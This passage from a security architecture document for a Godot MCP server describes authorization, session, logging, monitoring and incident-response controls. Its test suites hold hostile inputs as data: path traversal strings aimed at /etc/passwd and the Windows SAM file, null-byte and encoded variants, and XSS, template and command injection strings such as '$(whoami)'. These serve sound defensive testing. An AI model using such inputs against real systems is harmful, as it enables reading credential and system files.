// src/security/permissions.ts
export enum Permission {
  // Read permissions
  READ_FILE = 'file:read',
  READ_SCENE = 'scene:read',
  READ_PROJECT = 'project:read',
  
  // Write permissions
  WRITE_FILE = 'file:write',
  WRITE_SCENE = 'scene:write',
  WRITE_PROJECT = 'project:write',
  
  // Delete permissions (highest risk)
  DELETE_FILE = 'file:delete',
  DELETE_SCENE = 'scene:delete',
  
  // Admin permissions
  MANAGE_KEYS = 'admin:keys',
  VIEW_AUDIT_LOGS = 'admin:audit',
}

export interface PermissionSet {
  readonly permissions: Permission[];
  
  hasPermission(permission: Permission): boolean;
  hasAllPermissions(permissions: Permission[]): boolean;
}

// Pre-defined roles
export const ROLES = {
  READONLY: [
    Permission.READ_FILE,
    Permission.READ_SCENE,
    Permission.READ_PROJECT,
  ],
  
  DEVELOPER: [
    Permission.READ_FILE,
    Permission.READ_SCENE,
    Permission.READ_PROJECT,
    Permission.WRITE_FILE,
    Permission.WRITE_SCENE,
  ],
  
  ADMIN: Object.values(Permission), // All permissions
} as const;
```

#### Authorization Middleware
**Control ID**: SEC-AUTHZ-002  
```typescript
// src/middleware/authorize.middleware.ts
export function authorize(...requiredPermissions: Permission[]) {
  return async (req: Request, res: Response, next: NextFunction) => {
    const keyRecord = req.apiKey;
    
    // Check if API key has required permissions
    for (const permission of requiredPermissions) {
      if (!keyRecord.permissions.includes(permission)) {
        auditLog({
          action: 'authorization_failed',
          actorId: keyRecord.id,
          requiredPermission: permission,
          severity: 'MEDIUM',
          timestamp: new Date(),
        });
        
        return res.status(403).json({
          error: 'Insufficient permissions',
          code: 'FORBIDDEN',
          required: requiredPermissions,
        });
      }
    }
    
    next();
  };
}

// Usage
app.post('/tools/read_file', 
  authenticateAPIKey,
  authorize(Permission.READ_FILE),
  handleReadFile
);

app.post('/tools/delete_file',
  authenticateAPIKey,
  authorize(Permission.DELETE_FILE),
  handleDeleteFile
);
```

### 4.2 Session Management (Optional)

#### Stateless Sessions (JWT)
**Control ID**: SEC-SESS-001  
```typescript
// src/auth/session.ts
import jwt from 'jsonwebtoken';

interface SessionPayload {
  apiKeyId: string;
  permissions: Permission[];
  iat: number;  // Issued at
  exp: number;  // Expiration
}

export class SessionManager {
  private readonly JWT_SECRET = process.env.JWT_SECRET!;
  private readonly SESSION_TTL = 3600; // 1 hour

  /**
   * Create JWT session token (alternative to API key for web clients)
   */
  createSession(apiKeyRecord: APIKeyRecord): string {
    const payload: SessionPayload = {
      apiKeyId: apiKeyRecord.id,
      permissions: apiKeyRecord.permissions,
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + this.SESSION_TTL,
    };

    return jwt.sign(payload, this.JWT_SECRET, {
      algorithm: 'HS256',
    });
  }

  /**
   * Verify and decode session token
   */
  verifySession(token: string): SessionPayload {
    try {
      return jwt.verify(token, this.JWT_SECRET) as SessionPayload;
    } catch (error) {
      throw new SecurityError('Invalid or expired session token', 'SEC-SESS-001');
    }
  }
}

// Session middleware (alternative to API key auth)
export function authenticateSession(req: Request, res: Response, next: NextFunction): void {
  const sessionToken = req.headers['x-session-token'] as string;
  
  if (!sessionToken) {
    return res.status(401).json({ error: 'Missing session token' });
  }

  try {
    const session = sessionManager.verifySession(sessionToken);
    req.session = session;
    next();
  } catch (error) {
    return res.status(401).json({ error: 'Invalid session' });
  }
}
```

---

## 5. Secure Coding Practices

### 5.1 Secrets Management

#### Never Log Secrets
**Control ID**: SEC-CODE-001  
```typescript
// src/logging/sanitize.ts
const SENSITIVE_PATTERNS = [
  /api[_-]?key/i,
  /password/i,
  /token/i,
  /secret/i,
  /credential/i,
  /auth/i,
];

const REDACTED = '[REDACTED]';

export function sanitizeLogData(data: any): any {
  if (typeof data === 'string') {
    return data;
  }

  if (Array.isArray(data)) {
    return data.map(sanitizeLogData);
  }

  if (typeof data === 'object' && data !== null) {
    const sanitized: any = {};
    for (const [key, value] of Object.entries(data)) {
      if (SENSITIVE_PATTERNS.some(pattern => pattern.test(key))) {
        sanitized[key] = REDACTED;
      } else {
        sanitized[key] = sanitizeLogData(value);
      }
    }
    return sanitized;
  }

  return data;
}

// Logger wrapper
export function secureLog(level: string, message: string, data?: any): void {
  logger[level](message, sanitizeLogData(data));
}
```

#### Environment Variable Validation
**Control ID**: SEC-CODE-002  
```typescript
// src/config/env-validator.ts
import { z } from 'zod';

const EnvSchema = z.object({
  NODE_ENV: z.enum(['development', 'production', 'test']),
  PORT: z.coerce.number().int().positive().default(3000),
  HOST: z.string().ip().default('127.0.0.1'),
  
  // Secrets (required in production)
  JWT_SECRET: z.string().min(32).optional(),
  API_KEY_SALT: z.string().min(16).optional(),
  GODOT_MCP_MASTER_KEY: z.string().min(32).optional(),
  
  // TLS (required for non-localhost)
  TLS_CERT_PATH: z.string().optional(),
  TLS_KEY_PATH: z.string().optional(),
  
  // Feature flags
  REQUIRE_API_KEY: z.coerce.boolean().default(false),
  ENABLE_AUDIT_LOGGING: z.coerce.boolean().default(true),
}).refine(
  (env) => {
    // Require secrets in production
    if (env.NODE_ENV === 'production') {
      return env.JWT_SECRET && env.API_KEY_SALT && env.GODOT_MCP_MASTER_KEY;
    }
    return true;
  },
  'Secrets required in production environment'
).refine(
  (env) => {
    // Require TLS if not localhost
    if (env.HOST !== '127.0.0.1') {
      return env.TLS_CERT_PATH && env.TLS_KEY_PATH;
    }
    return true;
  },
  'TLS certificate required for non-localhost binding'
);

export function validateEnv(): void {
  try {
    EnvSchema.parse(process.env);
  } catch (error) {
    console.error('Environment validation failed:', error);
    process.exit(1);
  }
}
```

### 5.2 Output Sanitization

#### Sanitize Responses
**Control ID**: SEC-CODE-003  
```typescript
// src/sanitizers/response-sanitizer.ts
export class ResponseSanitizer {
  /**
   * Remove internal implementation details from responses
   */
  sanitizeToolResponse(response: any): any {
    if (typeof response !== 'object' || response === null) {
      return response;
    }

    const sanitized = { ...response };

    // Remove internal paths (convert to relative)
    if (sanitized.path) {
      sanitized.path = this.sanitizePath(sanitized.path);
    }

    // Remove stack traces
    delete sanitized.stack;
    delete sanitized.stackTrace;

    // Remove internal error details
    delete sanitized.__proto__;
    delete sanitized.constructor;

    // Remove system information
    delete sanitized.hostname;
    delete sanitized.pid;
    delete sanitized.platform;

    return sanitized;
  }

  private sanitizePath(absolutePath: string): string {
    // Convert absolute path to res:// URI
    const relativePath = path.relative(PROJECT_ROOT, absolutePath);
    return `res://${relativePath}`;
  }
}
```

### 5.3 Dependency Management

#### Dependency Pinning
**Control ID**: SEC-CODE-004  
```json
// package.json - Use exact versions
{
  "dependencies": {
    "@modelcontextprotocol/sdk": "1.0.0",  // Exact version, not ^1.0.0
    "express": "4.18.2",
    "zod": "3.22.4"
  },
  "devDependencies": {
    "typescript": "5.3.3",
    "@types/node": "20.10.5"
  },
  "scripts": {
    "audit": "npm audit --audit-level=moderate",
    "audit:fix": "npm audit fix",
    "check-updates": "npx npm-check-updates",
    "preinstall": "npx lockfile-lint --path package-lock.json --validate-https --allowed-hosts npm"
  }
}
```

#### Automated Dependency Scanning
**Control ID**: SEC-CODE-005  
```yaml
# .github/workflows/security.yml
name: Security Scan

on:
  push:
    branches: [main, develop]
  pull_request:
  schedule:
    - cron: '0 0 * * 1'  # Weekly Monday scan

jobs:
  dependency-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: npm audit
        run: npm audit --audit-level=moderate
      
      - name: Snyk scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
      
      - name: OWASP Dependency Check
        uses: dependency-check/Dependency-Check_Action@main
        with:
          project: 'godot-mcp'
          path: '.'
          format: 'HTML'
```

---

## 6. Security Testing Strategy

### 6.1 Penetration Testing Scenarios

#### Test Cases
**Control ID**: SEC-TEST-001

**Test Suite: Path Traversal**
```typescript
// tests/security/path-traversal.test.ts
describe('Path Traversal Prevention', () => {
  test('should reject ../ sequences', async () => {
    const response = await client.callTool('read_file', {
      path: '../../../etc/passwd',
    });
    
    expect(response.error).toBeDefined();
    expect(response.error.code).toBe('SEC-VAL-002');
  });

  test('should reject Windows ..\ sequences', async () => {
    const response = await client.callTool('read_file', {
      path: '..\\..\\..\\Windows\\System32\\config\\SAM',
    });
    
    expect(response.error).toBeDefined();
  });

  test('should reject URL-encoded traversal', async () => {
    const response = await client.callTool('read_file', {
      path: '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    });
    
    expect(response.error).toBeDefined();
  });

  test('should reject null byte injection', async () => {
    const response = await client.callTool('read_file', {
      path: 'legitimate.gd\0../../../etc/passwd',
    });
    
    expect(response.error).toBeDefined();
  });

  test('should reject symlink traversal', async () => {
    // Create symlink pointing outside project
    await fs.symlink('/etc/passwd', path.join(PROJECT_ROOT, 'link_to_passwd'));
    
    const response = await client.callTool('read_file', {
      path: 'res://link_to_passwd',
    });
    
    expect(response.error).toBeDefined();
  });
});
```

**Test Suite: Authorization**
```typescript
// tests/security/authorization.test.ts
describe('Authorization', () => {
  test('should reject request without API key (when required)', async () => {
    process.env.REQUIRE_API_KEY = 'true';
    
    const response = await fetch('http://localhost:3000/tools/read_file', {
      method: 'POST',
      body: JSON.stringify({ path: 'res://test.gd' }),
    });
    
    expect(response.status).toBe(401);
  });

  test('should reject readonly key for write operation', async () => {
    const readonlyKey = await createAPIKey({ permissions: ROLES.READONLY });
    
    const response = await client.callTool('write_file', {
      path: 'res://new.gd',
      content: 'extends Node',
    }, {
      headers: { Authorization: `Bearer ${readonlyKey}` },
    });
    
    expect(response.error.code).toBe('FORBIDDEN');
  });
});
```

### 6.2 Fuzzing Strategy

#### Input Fuzzing
**Control ID**: SEC-TEST-002  
```typescript
// tests/security/fuzzing.test.ts
import { faker } from '@faker-js/faker';

describe('Input Fuzzing', () => {
  test('fuzz path inputs', async () => {
    const fuzzInputs = [
      // Malformed paths
      '/',
      '',
      ' '.repeat(10000),
      '\0'.repeat(100),
      
      // Special characters
      '<script>alert("xss")</script>',
      '${{7*7}}',  // Template injection
      '$(whoami)',  // Command injection
      
      // Unicode exploits
      '\u202e',  // Right-to-left override
      '\uff0e\uff0e\uff0f',  // Fullwidth traversal
      
      // Random data
      ...Array.from({ length: 100 }, () => faker.system.filePath()),
    ];

    for (const input of fuzzInputs) {
      const response = await client.callTool('read_file', { path: input });
      
      // Should either succeed (valid input) or return structured error
      expect(
        response.content !== undefined || response.error !== undefined
      ).toBe(true);
      
      // Should never crash or return stack traces
      expect(response.stack).toBeUndefined();
    }
  });
});
```

### 6.3 Automated Security Testing

#### CI/CD Security Gate
**Control ID**: SEC-TEST-003  
```yaml
# .github/workflows/security-gate.yml
name: Security Gate

on: [pull_request]

jobs:
  security-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Run security test suite
        run: npm run test:security
      
      - name: Static analysis (Semgrep)
        uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/owasp-top-ten
            p/nodejs
      
      - name: Secret scanning
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: ${{ github.event.repository.default_branch }}
      
      - name: Block on critical findings
        run: |
          if [ -f security-report.json ]; then
            CRITICAL=$(jq '.findings[] | select(.severity=="critical") | length' security-report.json)
            if [ "$CRITICAL" -gt 0 ]; then
              echo "Critical security findings detected!"
              exit 1
            fi
          fi
```

---

## 7. Incident Response

### 7.1 Detection

#### Security Monitoring
**Control ID**: SEC-IR-001  
```typescript
// src/monitoring/security-monitor.ts
export class SecurityMonitor {
  private readonly alertThresholds = {
    failedAuthAttempts: 5,           // 5 failed auths in 5 minutes
    pathTraversalAttempts: 3,        // 3 traversal attempts in 5 minutes
    errorRate: 0.5,                  // 50% error rate
    requestRate: 1000,               // 1000 requests per minute
  };

  async monitorSecurityEvents(): Promise<void> {
    const interval = 60 * 1000; // 1 minute
    
    setInterval(async () => {
      const events = await this.getRecentEvents(interval);
      
      // Check for attack patterns
      await this.detectBruteForce(events);
      await this.detectPathTraversal(events);
      await this.detectDDoS(events);
      await this.detectDataExfiltration(events);
    }, interval);
  }

  private async detectBruteForce(events: AuditEvent[]): Promise<void> {
    const failedAuths = events.filter(e => e.action === 'auth_failed');
    
    if (failedAuths.length > this.alertThresholds.failedAuthAttempts) {
      await this.createSecurityAlert({
        type: 'BRUTE_FORCE_ATTACK',
        severity: 'HIGH',
        details: {
          failedAttempts: failedAuths.length,
          targetAccounts: [...new Set(failedAuths.map(e => e.actorId))],
        },
        recommendedAction: 'Temporarily block IP address',
      });
    }
  }

  private async detectDataExfiltration(events: AuditEvent[]): Promise<void> {
    const readOperations = events.filter(e => e.action === 'file_read');
    const totalBytesRead = readOperations.reduce((sum, e) => sum + (e.details?.size || 0), 0);
    
    // Alert if >100MB read in 1 minute
    if (totalBytesRead > 100 * 1024 * 1024) {
      await this.createSecurityAlert({
        type: 'POTENTIAL_DATA_EXFILTRATION',
        severity: 'HIGH',
        details: {
          bytesRead: totalBytesRead,
          filesAccessed: readOperations.length,
        },
        recommendedAction: 'Review accessed files and revoke API key',
      });
    }
  }
}
```

### 7.2 Response

#### Circuit Breaker Pattern
**Control ID**: SEC-IR-002  
```typescript
// src/resilience/circuit-breaker.ts
export class CircuitBreaker {
  private state: 'CLOSED' | 'OPEN' | 'HALF_OPEN' = 'CLOSED';
  private failureCount = 0;
  private readonly threshold = 10; // Open after 10 failures
  private readonly timeout = 60000; // 1 minute cooldown

  async execute<T>(fn: () => Promise<T>): Promise<T> {
    if (this.state === 'OPEN') {
      throw new Error('Circuit breaker is OPEN. Service temporarily unavailable.');
    }

    try {
      const result = await fn();
      this.onSuccess();
      return result;
    } catch (error) {
      this.onFailure();
      throw error;
    }
  }

  private onSuccess(): void {
    this.failureCount = 0;
    if (this.state === 'HALF_OPEN') {
      this.state = 'CLOSED';
      auditLog({
        action: 'circuit_breaker_closed',
        severity: 'LOW',
        timestamp: new Date(),
      });
    }
  }

  private onFailure(): void {
    this.failureCount++;
    
    if (this.failureCount >= this.threshold) {
      this.state = 'OPEN';
      
      auditLog({
        action: 'circuit_breaker_open',
        severity: 'HIGH',
        details: { failureCount: this.failureCount },
        timestamp: new Date(),
      });

      // Attempt recovery after timeout
      setTimeout(() => {
        this.state = 'HALF_OPEN';
        this.failureCount = 0;
      }, this.timeout);
    }
  }
}

// Usage
const circuitBreaker = new CircuitBreaker();

export async function handleToolInvocation(tool: string, args: any): Promise<any> {
  return circuitBreaker.execute(async () => {
    return await executeTool(tool, args);
  });
}
```

#### Emergency Shutdown
**Control ID**: SEC-IR-003  
```typescript
// src/server.ts
export class MCPServer {
  private isShuttingDown = false;

  /**
   * Emergency shutdown triggered by security incident
   */
  async emergencyShutdown(reason: string): Promise<void> {
    if (this.isShuttingDown) return;
    this.isShuttingDown = true;

    auditLog({
      action: 'emergency_shutdown',
      severity: 'CRITICAL',
      details: { reason },
      timestamp: new Date(),
    });

    // 1. Stop accepting new connections
    this.httpServer.close();

    // 2. Revoke all active sessions
    await sessionManager.revokeAllSessions();

    // 3. Kill Godot process
    if (this.godotProcess) {
      this.godotProcess.kill('SIGTERM');
    }

    // 4. Flush logs
    await auditLogger.end();

    // 5. Exit process
    process.exit(1);
  }

  /**
   * Graceful shutdown (normal termination)
   */
  async gracefulShutdown(): Promise<void> {
    auditLog({
      action: 'graceful_shutdown',
      severity: 'LOW',
      timestamp: new Date(),
    });

    // Wait for active requests to complete (max 30s)
    await Promise.race([
      this.waitForActiveRequests(),
      sleep(30000),
    ]);

    await this.emergencyShutdown('Graceful shutdown');
  }
}

// Shutdown triggers
process.on('SIGTERM', () => server.gracefulShutdown());
process.on('SIGINT', () => server.gracefulShutdown());
process.on('uncaughtException', (error) => {
  auditLog({
    action: 'uncaught_exception',
    severity: 'CRITICAL',
    details: { error: error.message },
    timestamp: new Date(),
  });
  server.emergencyShutdown(`Uncaught exception: ${error.message}`);
});
```

### 7.3 Recovery

#### Backup & Restore
**Control ID**: SEC-IR-004  
```typescript
// src/backup/backup-manager.ts
export class BackupManager {
  private readonly backupDir = path.join(PROJECT_ROOT, '.godot-mcp', 'backups');

  /**
   * Create backup before destructive operation
   */
  async createBackup(filePath: string): Promise<string> {
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const relativePath = path.relative(PROJECT_ROOT, filePath);
    const backupPath = path.join(
      this.backupDir,
      timestamp,
      relativePath
    );

    await fs.mkdir(path.dirname(backupPath), { recursive: true });
    await fs.copyFile(filePath, backupPath);

    auditLog({
      action: 'backup_created',
      severity: 'LOW',
      details: { originalPath: filePath, backupPath },
      timestamp: new Date(),
    });

    return backupPath;
  }

  /**
   * Restore from backup
   */
  async restore(backupPath: string, targetPath: string): Promise<void> {
    await fs.copyFile(backupPath, targetPath);

    auditLog({
      action: 'backup_restored',
      severity: 'MEDIUM',
      details: { backupPath, targetPath },
      timestamp: new Date(),
    });
  }

  /**
   * List available backups for a file
   */
  async listBackups(filePath: string): Promise<BackupInfo[]> {
    const relativePath = path.relative(PROJECT_ROOT, filePath);
    const backupPattern = path.join(this.backupDir, '*', relativePath);
    
    const backupFiles = await glob(backupPattern);
    
    return Promise.all(
      backupFiles.map(async (backupPath) => {
        const stat = await fs.stat(backupPath);
        return {
          path: backupPath,
          timestamp: stat.mtime,
          size: stat.size,
        };
      })
    );
  }

  /**
   * Auto-cleanup old backups (keep 30 days)
   */
  async cleanupOldBackups(): Promise<void> {
    const cutoff = Date.now() - 30 * 24 * 60 * 60 * 1000; // 30 days
    
    const backupDirs = await fs.readdir(this.backupDir);
    
    for (const dir of backupDirs) {
      const dirPath = path.join(this.backupDir, dir);
      const stat = await fs.stat(dirPath);
      
      if (stat.mtime.getTime() < cutoff) {
        await fs.rm(dirPath, { recursive: true });
      }
    }
  }
}
```

---

## 8. Security Architecture Diagrams

### 8.1 Defense in Depth Layers

```
┌─────────────────────────────────────────────────────────────────────┐
│                         Layer 7: Physical                          │
│                      (Developer's machine)                          │
└─────────────────────────────────────────────────────────────────────┘
                                   │
┌─────────────────────────────────────────────────────────────────────┐
│                       Layer 6: Application                          │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │ - Input validation (Zod schemas)                             │  │
│  │ - Path sanitization (traversal prevention)                   │  │
│  │ - Output sanitization (no internal paths)                    │  │
│  │ - Rate limiting (per-client throttling)                      │  │
│  │ - Circuit breaker (failure protection)                       │  │
│  └──────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
                                   │
┌─────────────────────────────────────────────────────────────────────┐
│                     Layer 5: Authentication                         │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │ MVP:  No authentication (localhost trust)                    │  │
│  │ Phase 2: API key authentication                              │  │
│  │          - PBKDF2 hashed storage                             │  │
│  │          - Encrypted keys file (AES-256)                     │  │
│  └──────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
                                   │
┌─────────────────────────────────────────────────────────────────────┐
│                     Layer 4: Transport                              │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │ MVP:  HTTP (localhost only)                                  │  │
│  │ Phase 2: HTTPS (TLS 1.3, strong ciphers)                     │  │
│  │          - HSTS headers                                      │  │
│  │          - Certificate validation                            │  │
│  └──────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
                                   │
┌─────────────────────────────────────────────────────────────────────┐
│                       Layer 3: Network                              │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │ - Localhost binding (127.0.0.1 only)                         │  │
│  │ - Firewall validation                                        │  │
│  │ - No 0.0.0.0 binding in MVP                                  │  │
│  └──────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
                                   │
┌─────────────────────────────────────────────────────────────────────┐
│                      Layer 2: Monitoring                            │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │ - Audit logging (all operations)                             │  │
│  │ - Security monitoring (attack detection)                     │  │
│  │ - Anomaly detection (behavioral analysis)                    │  │
│  └──────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
                                   │
┌─────────────────────────────────────────────────────────────────────┐
│                    Layer 1: Incident Response                       │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │ - Circuit breaker (automatic failure recovery)               │  │
│  │ - Emergency shutdown (critical incidents)                    │  │
│  │ - Backup & restore (data recovery)                           │  │
│  └──────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

### 8.2 Threat Actor vs. Controls Matrix

| Threat Actor | Network | Auth | Input Validation | Audit | Rate Limit | Monitoring |
|--------------|---------|------|------------------|-------|------------|------------|
| Malicious AI | ✓ | MVP: ✗<br>P2: ✓ | ✓ | ✓ | P2: ✓ | ✓ |
| Compromised Extension | ✓ | MVP: ✗<br>P2: ✓ | ✓ | ✓ | P2: ✓ | ✓ |
| Supply Chain | N/A | N/A | ✓ | ✓ | N/A | ✓ |
| Network Attacker | P2: ✓ | P2: ✓ | ✓ | ✓ | P2: ✓ | ✓ |
| Insider Threat | ✓ | P2: ✓ | ✓ | ✓ | N/A | ✓ |

**Legend**: ✓ = Mitigated, ✗ = Not mitigated, N/A = Not applicable

---

## 9. Dependency Security

### 9.1 Dependency Inventory

#### Critical Dependencies
| Package | Version | Purpose | Security Posture |
|---------|---------|---------|------------------|
| `@modelcontextprotocol/sdk` | 1.0.0 | MCP protocol implementation | Official SDK, actively maintained |
| `express` | 4.18.2 | HTTP server | Mature, frequent security updates |
| `zod` | 3.22.4 | Schema validation | Type-safe, well-tested |
| `winston` | 3.11.0 | Logging | Trusted, widely used |
| `jsonwebtoken` | 9.0.2 | JWT authentication (Phase 2) | Actively maintained |

#### Dependency Security Policy
**Control ID**: SEC-DEP-001

```json
// .npmrc
save-exact=true
package-lock=true
audit=true
audit-level=moderate
```

```bash
# Weekly dependency audit
npm audit --audit-level=moderate

# Update strategy
# - Patch versions: Auto-update weekly
# - Minor versions: Review and update monthly
# - Major versions: Manual review, test thoroughly
```

### 9.2 Supply Chain Attack Mitigation

#### Subresource Integrity (npm packages)
**Control ID**: SEC-DEP-002  
```bash
# Verify package integrity
npm audit signatures

# Lock dependencies
npm ci  # Use lockfile, not npm install

# Verify lockfile
npx lockfile-lint --path package-lock.json --validate-https --allowed-hosts npm
```

#### Dependency Review Process
```yaml
# .github/workflows/dependency-review.yml
name: Dependency Review

on: [pull_request]

jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      
      - name: Dependency Review
        uses: actions/dependency-review-action@v4
        with:
          fail-on-severity: moderate
          deny-licenses: GPL-3.0, AGPL-3.0
```

---

## 10. Compliance & Standards

### 10.1 Security Standards Alignment

#### OWASP Top 10 Coverage
| OWASP Risk | Relevance | Mitigation | Status |
|------------|-----------|------------|--------|
| A01:2021 Broken Access Control | High | Path validation, permission system | ✅ MVP |
| A02:2021 Cryptographic Failures | Medium | TLS, encrypted key storage | 🟡 Phase 2 |
| A03:2021 Injection | Medium | Input validation, Zod schemas | ✅ MVP |
| A04:2021 Insecure Design | Medium | Threat modeling, secure architecture | ✅ MVP |
| A05:2021 Security Misconfiguration | High | Localhost binding, secure defaults | ✅ MVP |
| A06:2021 Vulnerable Components | Medium | Dependency scanning, pinning | ✅ MVP |
| A07:2021 Auth Failures | Medium | API key auth, rate limiting | 🟡 Phase 2 |
| A08:2021 Software & Data Integrity | High | Dependency verification, audit logs | ✅ MVP |
| A09:2021 Logging Failures | Low | Comprehensive audit logging | ✅ MVP |
| A10:2021 SSRF | Low | Network isolation (localhost only) | ✅ MVP |

**Legend**: ✅ Implemented, 🟡 Planned, ❌ Not applicable

#### CWE/SANS Top 25 Coverage
- ✅ **CWE-22**: Path Traversal → Sanitization, validation
- ✅ **CWE-73**: External Control of File Name → Allowlisting
- ✅ **CWE-94**: Code Injection → GDScript static analysis
- ✅ **CWE-200**: Information Exposure → Error sanitization
- ✅ **CWE-400**: Resource Exhaustion → Rate limiting
- 🟡 **CWE-287**: Improper Authentication → API keys (Phase 2)
- 🟡 **CWE-352**: CSRF → CSRF tokens (Phase 2, web UI)

### 10.2 Security Certifications Roadmap

#### Planned Certifications (Post-MVP)
1. **OpenSSF Best Practices Badge**
   - Criteria: Documentation, testing, security practices
   - Target: Q3 2026

2. **SOC 2 Type I (for Enterprise Edition)**
   - Criteria: Security controls, audit logging, incident response
   - Target: Q4 2026 (if enterprise adoption)

3. **CVE Numbering Authority Registration**
   - Enable coordinated vulnerability disclosure
   - Target: Q2 2026

### 10.3 Security Communication Plan

#### Vulnerability Disclosure Policy
```markdown
# SECURITY.md

## Reporting Security Vulnerabilities

**DO NOT** create public GitHub issues for security vulnerabilities.

### Contact
- Email: security@godot-mcp.dev
- GPG Key: [Public key fingerprint]
- Response time: 48 hours

### Disclosure Timeline
1. Report received → Acknowledgment (48h)
2. Triage and validation (7 days)
3. Develop fix (14 days)
4. Private disclosure to affected users (coordinated)
5. Public disclosure (30 days after fix release)

### Bug Bounty
Currently no formal bug bounty program. Acknowledgment in release notes.

### Hall of Fame
[List of security researchers who responsibly disclosed vulnerabilities]
```

---

## Appendix A: Security Checklist

### MVP Deployment Checklist
- [ ] Verify `HOST=127.0.0.1` in production config
- [ ] Run `npm audit` before deployment
- [ ] Enable audit logging (`ENABLE_AUDIT_LOGGING=true`)
- [ ] Test path traversal protection
- [ ] Verify error messages don't leak internal paths
- [ ] Configure log rotation (90 days retention)
- [ ] Document backup/restore procedure
- [ ] Set up security monitoring alerts
- [ ] Review all tool permissions
- [ ] Test circuit breaker behavior

### Phase 2 Deployment Checklist
- [ ] Generate and securely store API keys
- [ ] Configure TLS certificates (if non-localhost)
- [ ] Enable rate limiting
- [ ] Set up Redis for distributed rate limiting
- [ ] Test API key authentication
- [ ] Verify authorization middleware
- [ ] Configure HSTS headers
- [ ] Test emergency shutdown procedure
- [ ] Validate audit log analysis pipeline
- [ ] Perform penetration testing
- [ ] Document security incident response plan

---

## Appendix B: Glossary

- **MCP**: Model Context Protocol - protocol for AI agent tool invocation
- **Path Traversal**: Attack attempting to access files outside allowed directory
- **Defense in Depth**: Layered security approach with multiple controls
- **Circuit Breaker**: Pattern to prevent cascading failures
- **Audit Log**: Immutable record of security-relevant events
- **API Key**: Authentication credential for MCP clients
- **Rate Limiting**: Throttling requests to prevent abuse
- **TLS**: Transport Layer Security for encrypted communication
- **HSTS**: HTTP Strict Transport Security policy
- **PBKDF2**: Password-Based Key Derivation Function 2 (key hashing)
- **JWT**: JSON Web Token (session tokens)
- **mTLS**: Mutual TLS (bidirectional certificate authentication)

---

## Document Metadata

**Authors**: @security-architect  
**Reviewers**: @api-design-orchestrator, @implementation-expert  
**Approved By**: [To be assigned]  
**Next Review**: Q3 2026 (post-MVP launch)  
**Related Documents**:
- [System Architecture](./system-architecture.md)
- [API Specification](./api-specification.md)
- [Deployment Guide](./deployment-guide.md) *(to be created)*

---

**End of Security Architecture Document**
